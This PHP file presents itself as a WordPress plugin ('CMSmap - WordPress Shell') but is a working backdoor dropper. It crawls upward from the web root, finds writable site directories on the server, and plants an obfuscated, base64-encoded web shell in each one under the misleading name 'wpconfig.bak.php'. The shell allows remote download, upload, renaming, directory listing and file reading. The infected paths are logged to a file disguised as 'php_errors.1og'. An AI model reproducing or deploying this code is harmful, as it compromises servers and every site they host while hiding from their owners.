<?php
/**
 * Plugin Name: CMSmap - WordPress Shell
 * Plugin URI: https://github.com/m7x/cmsmap/
 * Description: Simple WordPress Shell - Usage of CMSmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developer assumes no liability and is not responsible for any misuse or damage caused by this program.
 * Version: 1.0
 * Author: CMSmap
 * Author URI: https://github.com/m7x/cmsmap/
 * License: GPLv2
 */

error_reporting(0);
ignore_user_abort(true);
header("content-Type: text/html; charset=gb2312");


function copy_file1($dest){
  file_put_contents($dest.DIRECTORY_SEPARATOR.'wpconfig.bak.php',base64_decode('PD9waHAgZXJyb3JfcmVwb3J0aW5nKDApOyRzcj0ic3QiLi8qKy8qKyovInJyIi8qKy8qKyovLiJldiI7JGlkPSRzci8qKy8qKyovKCJyaSIuImRfIi4ic2kiKTskcm49JHNyLyorLyorKi8oImVtIi4iYW4iLiJlciIpOyRkbj0kc3IvKisvKisqLygiZW0iLiJhbnIiLiJpZCIpOyRvZD0kc3IvKisvKisqLygicmkiLiJkbmUiLiJwbyIpOyRyZD0kc3IvKisvKisqLygicmkiLiJkZGEiLiJlciIpOyRjZD0kc3IvKisvKisqLygicmkiLiJkZXNvIi4ibGMiKTskZnBjPSRzci8qKy8qKyovKCJzdG4iLiJldG4iLiJvY190Ii4idXBfZSIuImxpZiIpOyRmZ2M9JHNyLyorLyorKi8oInN0biIuImV0biIuIm9jX3QiLiJlZ19lIi4ibGlmIik7JG11Zj0kc3IvKisvKisqLygiZWxpIi4iZl9kIi4iZWRhIi4ib2xwIi4idV9lIi4idm9tIik7JGRsZm9ybT0nPGZvcm0gbWV0aG9kPSJwb3N0Ij5GTjo8aW5wdXQgbmFtZT0iZm4iIHNpemU9IjIwIiB0eXBlPSJ0ZXh0Ij5VUkw6PGlucHV0IG5hbWU9InVybCIgc2l6ZT0iNTAiIHR5cGU9InRleHQiPjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJvayI+PC9mb3JtPic7JHVsZm9ybT0nPGZvcm0gbWV0aG9kPSJwb3N0IiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIj48aW5wdXQgbmFtZT0idWYiIHR5cGU9ImZpbGUiPlNQOjxpbnB1dCBuYW1lPSJzcCIgc2l6ZT0iNTAiIHR5cGU9InRleHQiPjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJvayI+PC9mb3JtPic7JHJuZm9ybT0nPGZvcm0gbWV0aG9kPSJwb3N0Ij5PTjo8aW5wdXQgbmFtZT0ib24iIHNpemU9IjUwIiB0eXBlPSJ0ZXh0Ij5OTjo8aW5wdXQgbmFtZT0ibm4iIHNpemU9IjUwIiB0eXBlPSJ0ZXh0Ij48aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0ib2siPjwvZm9ybT4nOyRscGZvcm09Jzxmb3JtIG1ldGhvZD0icG9zdCI+RFA6PGlucHV0IG5hbWU9ImRwIiBzaXplPSI1MCIgdHlwZT0idGV4dCI+PGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9Im9rIj48L2Zvcm0+Jzskc2Zmb3JtPSc8Zm9ybSBtZXRob2Q9InBvc3QiPkRGOjxpbnB1dCBuYW1lPSJkZiIgc2l6ZT0iNTAiIHR5cGU9InRleHQiPjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJvayI+PC9mb3JtPic7aWYoJF9HRVRbJ2FjdCddPT0nZGwnKXtlY2hvKCRkbGZvcm0pO2lmKCRfU0VSVkVSWydSRVFVRVNUX01FVEhPRCddPT0nUE9TVCcpeyRmcGMvKisvKisqLygkX1BPU1RbJ2ZuJ10sJGZnYy8qKy8qKyovKCRfUE9TVFsndXJsJ10pKTt9ZXhpdDt9aWYoJF9HRVRbJ2FjdCddPT0ndWwnKXtlY2hvKCR1bGZvcm0pO2lmKCRfU0VSVkVSWydSRVFVRVNUX01FVEhPRCddPT0nUE9TVCcpeyRzcD1lbXB0eSgkX1BPU1RbJ3NwJ10pPycuLyc6JF9QT1NUWydzcCddLicvJzskbXVmLyorLyorKi8oJC8qKy8qKyoveyJfRiIuIklMIi4iRVMifVsidWYiXVsidG1wX25hbWUiXSwkc3AuJC8qKy8qKyoveyJfRiIuIklMIi4iRVMifVsidWYiXVsibmFtZSJdKTt9ZXhpdDt9aWYoJF9HRVRbJ2FjdCddPT0ncm4nKXtlY2hvKCRybmZvcm0pO2lmKCRfU0VSVkVSWydSRVFVRVNUX01FVEhPRCddPT0nUE9TVCcpeyRybi8qKy8qKyovKCRfUE9TVFsnb24nXSwkX1BPU1RbJ25uJ10pO31leGl0O31pZigkX0dFVFsnYWN0J109PSdncCcpe2VjaG8oJGRuLyorLyorKi8oX19GSUxFX18pKTtleGl0O31pZigkX0dFVFsnYWN0J109PSdscCcpe2VjaG8oJGxwZm9ybSk7aWYoJF9TRVJWRVJbJ1JFUVVFU1RfTUVUSE9EJ109PSdQT1NUJyl7JGRwPSRfUE9TVFsnZHAnXS4nLyc7JGg9JG9kLyorLyorKi8oJGRwKTt3aGlsZSgoJGZuPSRyZC8qKy8qKyovKCRoKSkhPT1mYWxzZSl7aWYoJGlkLyorLyorKi8oJGRwLiRmbikpeyR0MS49J0QmbmJzcDsnLiRmbi4nPGJyPic7fWVsc2V7JHQyLj0nJm5ic3A7Jm5ic3A7Jy4kZm4uJzxicj4nO319JGNkLyorLyorKi8oJGRwKTtlY2hvKCRkcC4nPGJyPicuJHQxLiR0Mik7fWV4aXQ7fWlmKCRfR0VUWydhY3QnXT09J3NmJyl7ZWNobygkc2Zmb3JtKTtpZigkX1NFUlZFUlsnUkVRVUVTVF9NRVRIT0QnXT09J1BPU1QnKXskZGY9JF9QT1NUWydkZiddO2VjaG8oJzx0ZXh0YXJlYSBzdHlsZT0id2lkdGg6MTAwJTtoZWlnaHQ6MTAwJTsiIHdyYXA9Im9mZiI+Jy4kZmdjLyorLyorKi8oJGRmKS4nPC90ZXh0YXJlYT4nKTt9ZXhpdDt9Pz4='));

}



function writeTxt($content,$fileurl){
    $fp=fopen($fileurl,"a+");
    if($fp){
        fwrite($fp,$content);
    }
    fclose($fp);
    
  }

function listDir($dir){
   if(is_dir($dir)){
     if ($dh = opendir($dir)) {
        while (($file= readdir($dh)) !== false){
		
       if((is_dir($dir."/".$file)) && $file!="." && $file!="..")
       {
	    if(is_writable($dir."/".$file)&&is_readable($dir."/".$file))
		{
		     if(strpos($dir.$file,'.') !== false){ 
			       	  
			       	  if(is_dir($dir.$file.'//wp-includes//')){
			       	  	 copy_file1($dir.$file);
			       	  	 writeTxt($dir.$file,$_SERVER['DOCUMENT_ROOT'].'//php_errors.1og');
			       	  	echo "<b><font color='red'>file:</font></b>".$dir.$file."<font color='red'> wpincludes</font>"."<br><hr>";
			       	  	}
						if(is_dir($dir.$file.'//images//')){
			       	  	 copy_file1($dir.$file);
			       	  	 writeTxt($dir.$file,$_SERVER['DOCUMENT_ROOT'].'//php_errors.1og');
			       	  	echo "<b><font color='red'>file:</font></b>".$dir.$file."<font color='red'> wpincludes</font>"."<br><hr>";
			       	  	}


			       	  if(is_dir($dir.$file.'//modules//')){
			       	  	copy_file1($dir.$file);
			       	  	writeTxt($dir.$file,$_SERVER['DOCUMENT_ROOT'].'//php_errors.1og');
			       	  	echo "<b><font color='red'>file:</font></b>".$dir.$file."<font color='red'> modules</font>"."<br><hr>";
			       	  	
			       	  	}
			       	  if(is_dir($dir.$file.'//public_html//')){
			       	  	copy_file1($dir.$file.'//public_html//');
			       	  	writeTxt($dir.$file.'//public_html//',$_SERVER['DOCUMENT_ROOT'].'//php_errors.1og');
			       	  	echo "<b><font color='red'>file:</font></b>".$dir.$file."<font color='red'> publichtml</font>"."<br><hr>";
			       	  	
			       	  	}
			       	  if(is_file($dir.$file.'//index.php'))

{

copy_file1($dir.$file);
			       	  	writeTxt($dir.$file.'//index.php',$_SERVER['DOCUMENT_ROOT'].'//php_errors.1og');
			       	  	echo "<b><font color='red'>file:</font></b>".$dir.$file."<font color='red'> indexok</font>"."<br><hr>";

}
			       	}
		}else{
		if(is_writable($dir."/".$file))
		{
			       
			       if(strpos($dir.$file,'.') !== false){ 
			       	  if(is_dir($dir.$file.'//wp-includes//')){
			       	  	 copy_file1($dir.$file);
			       	  	 writeTxt($dir.$file,$_SERVER['DOCUMENT_ROOT'].'//php_errors.1og');
			       	  	echo "<b><font color='red'>file:</font></b>".$dir.$file."<font color='red'> wpincludes</font>"."<br><hr>";
			       	  	}
			       	  if(is_dir($dir.$file.'//modules//')){
			       	  	copy_file1($dir.$file);
			       	  	writeTxt($dir.$file,$_SERVER['DOCUMENT_ROOT'].'//php_errors.1og');
			       	  	echo "<b><font color='red'>file:</font></b>".$dir.$file."<font color='red'> modules</font>"."<br><hr>";
			       	  	
			       	  	}
			       	  if(is_dir($dir.$file.'//public_html//')){
			       	  	copy_file1($dir.$file.'//public_html//');
			       	  	writeTxt($dir.$file.'//public_html//',$_SERVER['DOCUMENT_ROOT'].'//php_errors.1og');
			       	  	echo "<b><font color='red'>file:</font></b>".$dir.$file."<font color='red'> publichtml</font>"."<br><hr>";
			       	  	
			       	  	}
			       	}
              
		}else
		{
	      
		}
		}
		
		listDir($dir."/".$file."/");
       }
     
       }
        }
closedir($dh);

     }
 
   }

ListDir($_SERVER['DOCUMENT_ROOT'].'//..//..//..//');
?>
